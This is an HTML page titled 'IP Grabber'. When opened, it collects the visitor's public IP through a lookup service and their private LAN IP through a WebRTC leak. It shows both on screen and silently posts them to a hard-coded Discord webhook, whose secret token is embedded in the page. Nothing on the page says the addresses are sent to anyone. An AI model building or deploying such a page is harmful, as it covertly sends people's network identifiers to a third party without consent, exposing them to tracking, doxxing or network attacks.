<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>IP Grabber</title>
    <style>
        body { font-family: Arial; background: #111; color: #0f0; padding: 20px; }
        #result { margin-top: 20px; font-size: 18px; }
        .public { color: #0ff; }
        .private { color: #f0f; }
    </style>
</head>
<body>
    <h2>Your IP Addresses</h2>
    <div id="result">Loading...</div>
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1556586908619112468/UmBXhpdq5ijQnk8nZmroZwEmNs5desvvoWOgVI5Nu9l66KT1lmTPAR3VAxrmOc9B2UZ';

        function getPrivateIP(callback) {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                const match = ipRegex.exec(ice.candidate.candidate);
                if (match) {
                    const ip = match[1];
                    if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                        callback(ip);
                        pc.close();
                    }
                }
            };
        }

        function getPublicIP(callback) {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => callback(data.ip))
                .catch(() => callback('Unknown'));
        }

        function sendToDiscord(publicIP, privateIP) {
            const payload = {
                content: `**Public IP:** ${publicIP}\n**Private IP:** ${privateIP}`
            };
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        getPublicIP(function(pub) {
            getPrivateIP(function(priv) {
                document.getElementById('result').innerHTML = 
                    `<span class="public">Public IP: ${pub}</span><br>` +
                    `<span class="private">Private IP: ${priv}</span>`;
                sendToDiscord(pub, priv);
            });
        });
    </script>
</body>
</html>
